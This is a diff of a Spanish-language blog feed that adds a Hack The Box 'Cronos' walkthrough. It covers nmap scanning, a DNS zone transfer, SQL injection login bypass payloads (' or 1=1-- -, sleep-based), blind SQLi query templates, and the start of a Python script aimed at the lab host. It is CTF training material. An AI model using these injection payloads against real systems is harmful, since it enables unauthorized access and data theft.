@@ -1,4 +1,602 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-11T21:28:23-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Charon</title><link href="http://localhost:4000/htb-obscurity/" rel="alternate" type="text/html" title="Hack The Box Charon" /><published>2022-01-11T00:00:00-06:00</published><updated>2022-01-11T00:00:00-06:00</updated><id>http://localhost:4000/htb-obscurity</id><content type="html" xml:base="http://localhost:4000/htb-obscurity/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/banner-charon.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-12T22:30:55-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Cronos</title><link href="http://localhost:4000/htb-cronos/" rel="alternate" type="text/html" title="Hack The Box Cronos" /><published>2022-01-12T00:00:00-06:00</published><updated>2022-01-12T00:00:00-06:00</updated><id>http://localhost:4000/htb-cronos</id><content type="html" xml:base="http://localhost:4000/htb-cronos/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cronos/banner-cronos.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;cronos&quot;&gt;Cronos&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.13.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.13
+PING 10.10.10.13 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.13&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.13: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;142 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.13 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 142.328/142.328/142.328/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.13 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-11 21:38 CST
+Initiating SYN Stealth Scan at 21:38
+Scanning 10.10.10.13 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 80/tcp on 10.10.10.13
+Discovered open port 22/tcp on 10.10.10.13
+Discovered open port 53/tcp on 10.10.10.13
+Completed SYN Stealth Scan at 21:39, 26.44s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.13
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2022-01-11 21:38:44 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;27s
+Not shown: 65532 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+53/tcp open  domain  syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;26.52 seconds
+           Raw packets sent: 131085 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.768MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;924B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.13
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,53,80
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,53,80 10.10.10.13 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-11 21:39 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.13
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+53/tcp open  domain  ISC BIND 9.10.3-P4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| dns-nsid: 
+|_  bind.version: 9.10.3-P4-Ubuntu
+80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;16.81 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el puerto 80 abierto el cual se encuentra asociado al servicio HTTP, así que antes de echarle un ojo vía web, vamos a ver a lo que nos enfrentamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.13/
+http://10.10.10.13/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.13], Title[Apache2 Ubuntu Default Page: It works]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No vemos nada interesante, salvo la página default de Apache2.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cronos/cronos-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Algo que notamos sería que está abierto el puerto 53 en la máquina, el cual está asociado al servicio DNS; por lo que podríamos utiliar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nslookup&lt;/code&gt; para obtener un poco de información debido a que en la captura de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; vemos la palabra &lt;strong&gt;domain&lt;/strong&gt;, por lo que ya nos hace pensar que se está aplicando &lt;strong&gt;&lt;em&gt;virtual hosting&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nslookup
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; server 10.10.10.13
+Default server: 10.10.10.13
+Address: 10.10.10.13#53
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.10.10.13
+13.10.10.10.in-addr.arpa        name &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns1.cronos.htb.
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos el dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cronos.htb&lt;/code&gt;, así que vamos a agregarlo a nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; y ahora vamos a realizar consultas hacia el servidor DNS para obtener otros dominios o subdominios.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ dig @10.10.10.13 cronos.htb ns
+                                                                
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.16.15-Debian &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; @10.10.10.13 cronos.htb ns                                                                        
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 server found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Got answer:                                                  
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;: QUERY, status: NOERROR, id: 62667
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096                          
+;; QUESTION SECTION:
+;cronos.htb.                    IN      NS
+                                                                
+;; ANSWER SECTION:
+cronos.htb.             604800  IN      NS      ns1.cronos.htb.
+                                                                
+;; ADDITIONAL SECTION:                                          
+ns1.cronos.htb.         604800  IN      A       10.10.10.13
+
+;; Query time: 168 msec         
+;; SERVER: 10.10.10.13#53(10.10.10.13)
+;; WHEN: mié ene 12 18:32:56 CST 2022                    
+;; MSG SIZE  rcvd: 73
+                                
+❯ dig @10.10.10.13 cronos.htb mx
+                                                                
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.15-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @10.10.10.13 cronos.htb mx                                                                        
+; (1 server found)
+;; global options: +cmd
+;; Got answer:                                                  
+;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 33886
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096                                                                                            
+;; QUESTION SECTION:
+;cronos.htb.                    IN      MX
+                                                                
+;; AUTHORITY SECTION:                                           
+cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+
+;; Query time: 164 msec
+;; SERVER: 10.10.10.13#53(10.10.10.13)                                                                                           
+;; WHEN: mié ene 12 18:33:10 CST 2022
+;; MSG SIZE  rcvd: 81
+
+❯ dig @10.10.10.13 cronos.htb axfr
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.15-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @10.10.10.13 cronos.htb axfr
+; (1 server found)
+;; global options: +cmd
+cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+cronos.htb.             604800  IN      NS      ns1.cronos.htb.
+cronos.htb.             604800  IN      A       10.10.10.13
+admin.cronos.htb.       604800  IN      A       10.10.10.13
+ns1.cronos.htb.         604800  IN      A       10.10.10.13
+www.cronos.htb.         604800  IN      A       10.10.10.13
+cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+;; Query time: 172 msec
+;; SERVER: 10.10.10.13#53(10.10.10.13)
+;; WHEN: mié ene 12 18:33:44 CST 2022
+;; XFR size: 7 records (messages 1, bytes 203)
+
+❯ dig @10.10.10.13 cronos.htb ANY
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.15-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @10.10.10.13 cronos.htb ANY
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 59605
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;cronos.htb.                    IN      ANY
+
+;; ANSWER SECTION:
+cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+cronos.htb.             604800  IN      NS      ns1.cronos.htb.
+cronos.htb.             604800  IN      A       10.10.10.13
+
+;; ADDITIONAL SECTION:
+ns1.cronos.htb.         604800  IN      A       10.10.10.13
+
+;; Query time: 172 msec
+;; SERVER: 10.10.10.13#53(10.10.10.13)
+;; WHEN: mié ene 12 18:33:49 CST 2022
+;; MSG SIZE  rcvd: 131
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Logramos obtener el subdominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.cronos.htb&lt;/code&gt;, por lo que lo agregamos a nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; y posteriormente vamos a ver a lo que nos enfrentamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; para ambos dominios y despúes echarles un ojo vía web.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://cronos.htb/
+http://cronos.htb/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.18], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, HttpOnly[laravel_session], IP[10.10.10.13], Laravel, Title[Cronos], X-UA-Compatible[IE&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;edge]
+❯ whatweb http://admin.cronos.htb/
+http://admin.cronos.htb/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.13], Title[Login Page]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cronos/cronos-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cronos/cronos-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En el subdominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.cronos.htb&lt;/code&gt; tenemos un panel de login, por lo que ya deberíamos empezar a pensar en diversas formas de entrar al panel; como el uso de credenciales por default, aplicar fuerza bruta, inyecciones SQL, checar el código del sitio para encontrar posibles pistas, etc. Para este caso, vamos a ver las inyecciones SQL.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'&lt;/code&gt; - No vemos nada&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;' or 1=1-- -&lt;/code&gt; - Logramos ingresar al panel&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cronos/cronos-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;' or sleep(5)-- -&lt;/code&gt; - Vemos que la página tarda 5 segundos en responder, por lo que podríamos tratar de obtener credenciales de la base de datos.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Para hacerlo más interesante y aprender un poco, vamos a hacer una inyección SQL a ciegas (&lt;strong&gt;&lt;em&gt;SQLi blind&lt;/em&gt;&lt;/strong&gt;); por lo que debemos pensar una forma obtener información utilizando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sleep(t)&lt;/code&gt;. Para esto, debemos preguntar al servidor si la información que buscamos empieza por un caracter, si es verdadero que tarde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt; tiempo en responder y si es falso, que no tarde nada; mediante comandos de SQL sería &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if( substr( database(),x,1) = 'a', sleep(5), 1)&lt;/code&gt; en donde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt; nos indica la posición de los caracteres. Por lo tanto:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Nombre de la base de datos&lt;/strong&gt; - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if ( substr( database(),x,1 ) = 'a', sleep(5), 1)&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Nombre de las tablas&lt;/strong&gt; - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if ( substr( table_name,x,1 ) = 'a', sleep(5), 1) where table_schema=&amp;lt;&amp;lt;nombre_base_de_datos&amp;gt;&amp;gt; limit y,1&lt;/code&gt; en donde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt; es un número que nos indica el número de la tabla, es decir &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y=1&lt;/code&gt; es la primera tabla, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y=2&lt;/code&gt; es la segunda tabla y así sucesivamente.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Nombre de las columnas&lt;/strong&gt; -&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Información&lt;/strong&gt; -&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Para facilitarnos el trabajo, vamos a crear un script en python para obtener todo lo anterior, empezando primero con el nombre de la base de datos.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+#codgin: utf-8
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;def_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[!] Saliendo...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;def_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Variables globales
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://admin.cronos.htb/index.php&quot;&lt;/span&gt;
